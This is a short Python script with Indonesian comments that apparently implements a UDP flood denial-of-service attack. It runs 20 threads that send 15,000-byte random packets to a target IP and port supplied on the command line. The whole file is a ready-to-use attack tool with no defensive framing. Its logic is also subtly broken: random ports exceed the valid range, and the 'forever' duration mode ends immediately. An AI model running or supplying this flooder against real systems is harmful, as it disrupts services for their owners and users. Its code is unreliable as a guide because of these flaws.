#!/usr/bin/python
import socket
import random
import os
import sys
import time
import threading

# Cek jumlah argument
if len(sys.argv) != 4:
    sys.exit('Usage: python f.py <ip> <port (0=random)> <length (0=forever)>')

# Fungsi UDPFlood
def UDPFlood(ip, port, dur):
    randport = (True, False)[port == 0]  # Tentukan apakah port acak
    clock = time.time  # Waktu saat ini
    duration = (1, (clock() + dur))[dur > 0]  # Tentukan durasi

    print(f'Sending packets to: {ip}:{port or "random"} for {dur or "infinite"} seconds')
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Membuat socket UDP
    bytes = os.urandom(15000)  # Menggunakan ukuran paket yang lebih kecil untuk efisiensi

    while True:
        # Pilih port acak jika port yang diberikan adalah 0
        target_port = (random.randint(1,15000000), port)[randport]
        if clock() < duration:
            try:
                sock.sendto(bytes, (ip, target_port))  # Kirim paket UDP
            except Exception as e:
                print(f"Error: {e}")
                break
        else:
            break
    sock.close()  # Menutup socket setelah selesai
    print('Thread done')

# Bagian utama yang dijalankan
if __name__ == "__main__":
    ip = sys.argv[1]  # IP yang dituju
    port = int(sys.argv[2])  # Port yang dituju
    dur = int(sys.argv[3])  # Durasi serangan

    threads = []  # Daftar thread
    for i in range(20):  # Jumlah thread yang dijalankan
        thread = threading.Thread(target=UDPFlood, args=(ip, port, dur))  # Membuat thread untuk UDPFlood
        thread.start()  # Menjalankan thread
        threads.append(thread)  # Menambahkan thread ke dalam daftar

    # Menunggu semua thread selesai
    for thread in threads:
        thread.join()

    print("All threads completed.")  # Semua thread selesai